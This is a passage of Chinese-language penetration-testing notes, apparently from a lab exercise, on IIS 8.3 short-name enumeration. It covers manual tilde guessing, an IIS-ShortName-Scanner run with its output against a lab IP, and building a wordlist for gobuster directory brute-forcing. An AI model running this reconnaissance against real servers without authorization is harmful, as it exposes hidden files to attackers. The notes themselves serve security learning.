可以利用這個特性慢慢推到出檔案名稱
1. 先猜第一個字。
```
http://target/~a 200 OK
http://target/~b 404 Not Found
```
2. 發現有a開頭的檔案，就來猜第二個字，根據他的respond，可以慢慢推倒出所有隱藏檔案的名稱。
```
http://target/~aa 404 Not Found
http://target/~ab 404 Not Found
...
http://target/~ao 404 Not Found
http://target/~ap 200 OK
```
## 自動列舉手法
>[!WARNING]
>利用 `IIS-ShortName-Scanner`可以先初步判斷，再用gobuster做目錄爆破
### IIS-ShortName-Scanner
[下載點](https://github.com/irsdl/IIS-ShortName-Scanner)
```shell-session
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```
```shell-session
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```
發現有一個file叫做TRANSF......，我們可以根據這個線索區找真正的檔案名稱
### 製作wordlist
>可利用下列指令抓/wordlist 裡面所有跟transf有關的字詞，產生wordlist
```shell-session
egrep -r ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
```
### gobuster
```shell-session
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```